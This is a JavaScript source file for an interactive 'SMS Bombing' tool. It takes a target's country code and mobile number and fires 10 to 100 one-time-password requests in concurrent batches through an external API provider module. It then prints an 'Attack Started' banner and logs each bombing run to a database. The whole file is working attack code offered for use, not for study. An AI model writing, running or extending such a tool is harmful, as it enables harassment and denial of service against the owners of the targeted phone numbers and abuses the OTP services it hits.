// SMS OTP bombing helper
// mirrors functionality from the Python example provided by the user

const readline = require('readline');
const chalk = require('chalk');
const ora = require('ora');
const ui = require('../includes/banner');
const APIProvider = require('./provider');
const os = require('os');
const db = require('../includes/dbgateway');

// simple prompt wrapper; in autotest mode we feed predefined answers
let _testQueue = [];

if (process.argv[2] === '--autotest') {
    // remaining args are the answers
    _testQueue = process.argv.slice(3);
}

function askQuestion(prompt) {
    if (_testQueue.length) {
        const answer = _testQueue.shift();
        // echo so the user (and tests) see it
        process.stdout.write(prompt + answer + os.EOL);
        return Promise.resolve(answer.trim());
    }

    return new Promise(resolve => {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        rl.question(prompt, ans => {
            rl.close();
            resolve(ans.trim());
        });
    });
}

function smsBanner() {
     ui.clearScreen();
    ui.printBanner();
    
}

function inputInstructions() {

 
console.log(`
${chalk.red("📲 SMS Bombing")}
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ${chalk.red("Instructions")}${" ".repeat(44)}┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ ${chalk.white("👉 Enter country code (e.g. ")}${chalk.red("+91")}${chalk.white(")")}                        ┃
┃ ${chalk.white("👉 Enter 10-digit mobile number (no special characters)")} ┃
┃ ${chalk.white("👉 Enter number of OTP to send max ")}${chalk.red("100")}                  ┃
┃ ${chalk.white("❌ Enter ")}${chalk.red("'x'")}${chalk.white(" to exit anytime")}                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`);
}

async function getCountryCode() {
    while (true) {
        const country_code = await askQuestion('🌍 Enter Country Code: ');
        if (country_code.toLowerCase() === 'x'){ ui.clearScreen(); ui.printBanner(); return 'exit'; }
        if (country_code.startsWith('+') && /^[0-9]+$/.test(country_code.slice(1))) {
            return country_code;
        }
        console.log(chalk.red('❌ Invalid format. Use format like +91'));
    }
}

async function getMobileNumber() {
    while (true) {
        const mobile = await askQuestion('📱 Enter 10-Digit Mobile Number: ');
        if (mobile.toLowerCase() === 'x'){ ui.clearScreen(); ui.printBanner();  return 'exit';}
        if (/^\d{10}$/.test(mobile)) {
            return mobile;
        }
        console.log(chalk.red('❌ Must be exactly 10 digits, no symbols.'));
    }
}

async function getOtpCount() {
    while (true) {
        const input = await askQuestion('📲 Enter number of OTPs to send (10–100): ');
        if (input.toLowerCase() === 'x'){ ui.clearScreen(); ui.printBanner();  return 'exit';}
        if (!/^[0-9]+$/.test(input)) {
            console.log(chalk.red('❌ Invalid input. Please enter a number.'));
            continue;
        }
        const count = parseInt(input, 10);
        if (count < 10 || count > 100) {
            console.log(chalk.red('❌ Please enter a number between 10 and 100.'));
            continue;
        }
        return count;
    }
}

function showAttackSummary(country_code, mobile, otpcount) {

    const width = 50;

    console.log("\n🚀 " + chalk.red("Attack Started"));

    console.log("┏" + "━".repeat(width) + "┓");

    console.log(
        "┃ " +
        chalk.white("Country code: ") +
        chalk.red(country_code)
        + " ".repeat(width - ("Country code: ".length + country_code.length) - 1) +
        "┃"
    );

    console.log(
        "┃ " +
        chalk.white("Mobile number: ") +
        chalk.red(mobile)
        + " ".repeat(width - ("Mobile number: ".length + mobile.length) - 1) +
        "┃"
    );

    console.log(
        "┃ " +
        chalk.white("OTP count: ") +
        chalk.red(otpcount)
        + " ".repeat(width - ("OTP count: ".length + String(otpcount).length) - 1) +
        "┃"
    );

    console.log("┗" + "━".repeat(width) + "┛\n");
}

async function run() {
    smsBanner();
    inputInstructions();

    const country_code = await getCountryCode();
    if (country_code === 'exit') return;
    const mobile = await getMobileNumber();
    if (mobile === 'exit') return;
    const otpcount = await getOtpCount();
    if (otpcount === 'exit') return;
    ui.clearScreen();
    ui.printBanner();
    showAttackSummary(country_code, mobile, otpcount);

    // build API provider and perform hits
    const provider = new APIProvider(country_code.replace('+',''), mobile, 'sms', 1);

    let success = 0;
    let failed = 0;

    // start progress spinner with counts
    const spinner = ora('Sending OTPs...').start();

    const concurrency = 10;

    // perform exactly otpcount hits in batches
    for (let sent = 0; sent < otpcount && APIProvider.status; sent += concurrency) {
        const batchSize = Math.min(concurrency, otpcount - sent);
        const batch = [];
        for (let i = 0; i < batchSize; i++) {
            batch.push(provider.hit());
        }
        const results = await Promise.all(batch);
        results.forEach(res => {
            if (res === true) success++;
            else failed++;
        });
        spinner.text = `Sending OTPs... (${success + failed}/${otpcount})`;
    }

    spinner.succeed('✅ OTP Bombing Completed!');

    // record database entry
    try {
       
        db.logOtpBomb({
            datetime: new Date().toISOString(),
            mobile,
            total: otpcount,
            sent: success
        });
        
    } catch (_e) {
        console.error('DEBUG: write failed', _e);
    }

    await askQuestion('\n🔙 Enter 0 to return to the main menu: ');
    ui.clearScreen();
    ui.printBanner();
}

module.exports = { run };

// if run directly from node this file, execute
if (require.main === module) {
    (async () => {
        await run();
    })();
}
